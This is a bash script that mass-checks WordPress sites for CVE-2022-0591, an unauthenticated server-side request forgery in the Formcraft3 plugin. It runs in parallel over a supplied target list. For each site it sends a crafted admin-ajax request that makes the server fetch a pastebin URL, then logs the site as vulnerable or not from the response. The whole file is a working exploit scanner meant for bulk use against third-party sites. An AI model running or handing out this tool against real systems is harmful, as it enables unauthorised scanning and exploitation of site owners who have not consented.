#!/bin/bash
# CVE-2022-0591 - Formcraft3 < 3.8.28 - Unauthenticated SSRF | Vulnerability Checker
# Created By Im-Hanzou
# Using GNU Parallel
# Usage: bash fc3er.sh list.txt thread

yellow='\033[0;33m'
cat << "EOF"
                                        
███████╗ ██████╗██████╗ ███████╗██████╗ 
██╔════╝██╔════╝╚════██╗██╔════╝██╔══██╗
█████╗  ██║      █████╔╝█████╗  ██████╔╝
██╔══╝  ██║      ╚═══██╗██╔══╝  ██╔══██╗
██║     ╚██████╗██████╔╝███████╗██║  ██║
╚═╝      ╚═════╝╚═════╝ ╚══════╝╚═╝  ╚═╝
EOF
printf "CVE-2022-0591 Mass Vulnerability Checker\n\n"
printf "${yellow}Created By Im-Hanzou
Github : im-hanzou\n\n"

touch vuln.txt notvuln.txt
exploit(){	
classic='\033[0m'
red='\e[41m'
green='\e[42m'
target=$1
thread=$2

if [[ $(curl -s --connect-timeout 10 --max-time 10 --insecure $target'/wp-admin/admin-ajax.php?action=formcraft3_get&URL=https://pastebin.com/raw/VaxXtjGV') =~ 'Sroot' ]]; 
then
    printf "${green}[ Vuln ]${classic} => [$target] \n";
    echo "$target" >> vuln.txt
    else
    printf "${red}[ Not Vuln ]${classic} => $target \n";
    echo "$target" >> notvuln.txt
fi
}

export -f exploit
parallel -j $2 exploit :::: $1 

total=$(cat vuln.txt | wc -l)
totalb=$(cat notvuln.txt | wc -l)
printf "\033[0;36mTotal Vuln : $total\n";
printf "\033[0;36mTotal Not Vuln : $totalb\n";
